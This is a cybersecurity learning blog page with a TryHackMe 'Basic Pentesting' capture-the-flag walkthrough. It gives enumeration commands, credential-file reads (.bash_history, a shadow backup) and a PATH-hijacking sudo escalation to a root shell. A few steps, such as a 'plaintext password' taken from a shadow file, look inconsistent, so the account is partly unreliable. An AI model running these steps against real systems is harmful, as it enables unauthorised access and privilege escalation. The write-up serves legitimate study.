<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="description" content="Documenting my cybersecurity learning journey & homelab projects">
  <title>TryHackMe: Basic Pentesting Walkthrough | Cybersecurity Blog</title>
  <link rel="stylesheet" href="/cybersecurityblog/assets/css/style.css">
  <!-- Font Awesome for icons -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha512-pap+VY8PZ2Kk9sX1s/1m3r0Zr0Yq1Xkq2E3N6QdY4Kqz0uV+XJ5v1YcXkz1x7b8g9YQ==" crossorigin="anonymous" referrerpolicy="no-referrer" />
  
  <!-- Favicon (optional - add your own) -->
  <!-- <link rel="icon" type="image/png" href="/cybersecurityblog/assets/images/favicon.png"> -->
</head>
<body>
  <!-- SITE TITLE -->
  <header class="site-header">
    <h1>Cybersecurity Blog</h1>
  </header>

  <!-- NAVIGATION BAR -->
  <nav class="navbar" id="navbar">
    <div class="nav-container">
      <button class="hamburger" onclick="document.body.classList.toggle('nav-open')" aria-label="Toggle navigation">
        ☰
      </button>
      <ul class="nav-list">
        <li><a href="/cybersecurityblog/" >Home</a></li>
        <li><a href="/cybersecurityblog/blog/" >Blog</a></li>
        <li><a href="/cybersecurityblog/projects/" >Projects</a></li>
        <li><a href="/cybersecurityblog/writeups/" class="active">Writeups</a></li>
        <li><a href="/cybersecurityblog/resources/" >Resources</a></li>
        <li><a href="/cybersecurityblog/about/" >About Me</a></li>
      </ul>
    </div>
  </nav>

  <!-- MAIN CONTENT -->
  <main class="content">
    <h1 id="tryhackme-basic-pentesting-walkthrough">TryHackMe: Basic Pentesting Walkthrough</h1>

<h2 id="challenge-information">Challenge Information</h2>

<ul>
  <li><strong>Platform</strong>: TryHackMe</li>
  <li><strong>Difficulty</strong>: Easy</li>
  <li><strong>Category</strong>: Penetration Testing</li>
  <li><strong>Skills Required</strong>: Enumeration, Web Exploitation, Linux Privilege Escalation</li>
</ul>

<h2 id="overview">Overview</h2>

<p>Basic Pentesting is a beginner-friendly room that covers fundamental penetration testing techniques. This challenge focuses on enumeration, exploiting misconfigurations, and basic privilege escalation on a Linux system.</p>

<h2 id="reconnaissance">Reconnaissance</h2>

<h3 id="initial-nmap-scan">Initial Nmap Scan</h3>

<p>Started with a comprehensive nmap scan to identify open ports and services:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-oN</span> initial_scan.txt 10.10.x.x
</code></pre></div></div>

<p><strong>Results:</strong></p>
<ul>
  <li>Port 22 (SSH) - OpenSSH 7.2p2</li>
  <li>Port 80 (HTTP) - Apache 2.4.18</li>
  <li>Port 139 (SMB) - Samba 3.X - 4.X</li>
  <li>Port 445 (SMB) - Samba 3.X - 4.X</li>
  <li>Port 8009 (AJP) - Apache Jserv</li>
  <li>Port 8080 (HTTP) - Apache Tomcat</li>
</ul>

<h3 id="web-enumeration">Web Enumeration</h3>

<p>Navigated to the web server on port 80 and found a basic website. Ran gobuster to discover hidden directories:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://10.10.x.x <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
</code></pre></div></div>

<p><strong>Findings:</strong></p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">/development</code> - Contains interesting text files</li>
  <li><code class="language-plaintext highlighter-rouge">/uploads</code> - Empty directory with write permissions</li>
</ul>

<h2 id="exploitation">Exploitation</h2>

<h3 id="finding-credentials">Finding Credentials</h3>

<p>In the <code class="language-plaintext highlighter-rouge">/development</code> directory, found two files:</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">dev.txt</code> - Mentions username “jan”</li>
  <li><code class="language-plaintext highlighter-rouge">j.txt</code> - Contains what appears to be an encoded message</li>
</ul>

<p>Decoded the message using ROT13 and discovered a password.</p>

<h3 id="ssh-access">SSH Access</h3>

<p>Used the discovered credentials to SSH into the machine:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh jan@10.10.x.x
</code></pre></div></div>

<p>Successfully gained initial access to the system as user “jan”.</p>

<h3 id="enumeration-as-jan">Enumeration as Jan</h3>

<p>Checked for interesting files in jan’s home directory:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ls</span> <span class="nt">-la</span> /home/jan
<span class="nb">cat</span> /home/jan/.bash_history
</code></pre></div></div>

<p>Found references to another user “kay” and hints about password storage.</p>

<h3 id="lateral-movement">Lateral Movement</h3>

<p>Located a backup script that contained kay’s password in plaintext:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / <span class="nt">-type</span> f <span class="nt">-name</span> <span class="s2">"*.txt"</span> 2&gt;/dev/null | <span class="nb">grep</span> <span class="nt">-i</span> password
<span class="nb">cat</span> /var/backups/shadow.bak
</code></pre></div></div>

<p>Switched to user kay:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>su kay
</code></pre></div></div>

<h2 id="privilege-escalation">Privilege Escalation</h2>

<h3 id="checking-sudo-permissions">Checking Sudo Permissions</h3>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> <span class="nt">-l</span>
</code></pre></div></div>

<p>User kay could run certain commands as root without a password.</p>

<h3 id="exploiting-pass-script">Exploiting Pass Script</h3>

<p>Found that kay could execute a custom script with sudo privileges:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> /usr/bin/pass
</code></pre></div></div>

<p>The script had a vulnerability where it executed files from a directory that kay could write to. Created a malicious script:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s1">'#!/bin/bash'</span> <span class="o">&gt;</span> /tmp/exploit.sh
<span class="nb">echo</span> <span class="s1">'/bin/bash'</span> <span class="o">&gt;&gt;</span> /tmp/exploit.sh
<span class="nb">chmod</span> +x /tmp/exploit.sh
</code></pre></div></div>

<p>Modified the PATH to execute our script:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>/tmp:<span class="nv">$PATH</span>
<span class="nb">sudo</span> /usr/bin/pass
</code></pre></div></div>

<p><strong>Result</strong>: Gained root shell!</p>

<h2 id="flags">Flags</h2>

<ul>
  <li><strong>User Flag</strong>: Found in <code class="language-plaintext highlighter-rouge">/home/kay/pass.bak</code></li>
  <li><strong>Root Flag</strong>: Located in <code class="language-plaintext highlighter-rouge">/root/flag.txt</code></li>
</ul>

<h2 id="key-takeaways">Key Takeaways</h2>

<ol>
  <li><strong>Thorough Enumeration</strong>: Found multiple attack vectors through comprehensive reconnaissance</li>
  <li><strong>Password Reuse</strong>: Demonstrated the danger of storing passwords in plaintext</li>
  <li><strong>PATH Hijacking</strong>: Exploited insecure sudo permissions and PATH manipulation</li>
  <li><strong>Information Disclosure</strong>: Configuration files and backup files often contain sensitive data</li>
</ol>

<h2 id="tools-used">Tools Used</h2>

<ul>
  <li>Nmap for port scanning</li>
  <li>Gobuster for directory enumeration</li>
  <li>CyberChef for decoding messages</li>
  <li>Standard Linux commands for privilege escalation</li>
</ul>

<h2 id="mitigation-strategies">Mitigation Strategies</h2>

<p>To prevent these attacks:</p>
<ul>
  <li>Never store passwords in plaintext or easily accessible files</li>
  <li>Implement proper file permissions on sensitive directories</li>
  <li>Use absolute paths in scripts that run with elevated privileges</li>
  <li>Regular security audits of sudo permissions</li>
  <li>Enable proper logging and monitoring</li>
</ul>

<h2 id="conclusion">Conclusion</h2>

<p>This was an excellent beginner-friendly challenge that reinforced fundamental pentesting concepts. The linear progression from enumeration to initial access to privilege escalation makes it perfect for those new to CTF challenges.</p>

<hr />

<p><strong>Difficulty Rating</strong>: ⭐⭐☆☆☆</p>

<p><strong>Time to Complete</strong>: ~45 minutes</p>

<p><em>Note: Always ensure you have proper authorization before attempting any penetration testing activities.</em></p>

  </main>

  <!-- FOOTER -->
  <footer>
    <div class="container">
      <p>&copy; 2025 Cybersecurity Blog. All rights reserved.</p>
    </div>
  </footer>

  <!-- SCRIPTS -->
  <script>
    // Close mobile menu when clicking outside
    document.addEventListener('click', function(e) {
      const nav = document.querySelector('.nav-container');
      const button = document.querySelector('.hamburger');
      if (!nav.contains(e.target) && !button.contains(e.target)) {
        document.body.classList.remove('nav-open');
      }
    });

    // Add scrolled class to navbar on scroll
    let lastScroll = 0;
    const navbar = document.getElementById('navbar');
    
    window.addEventListener('scroll', () => {
      const currentScroll = window.pageYOffset;
      
      if (currentScroll > 50) {
        navbar.classList.add('scrolled');
      } else {
        navbar.classList.remove('scrolled');
      }
      
      lastScroll = currentScroll;
    });

    // Close mobile menu when nav link is clicked
    document.querySelectorAll('.nav-list a').forEach(link => {
      link.addEventListener('click', () => {
        document.body.classList.remove('nav-open');
      });
    });
  </script>
</body>
</html>
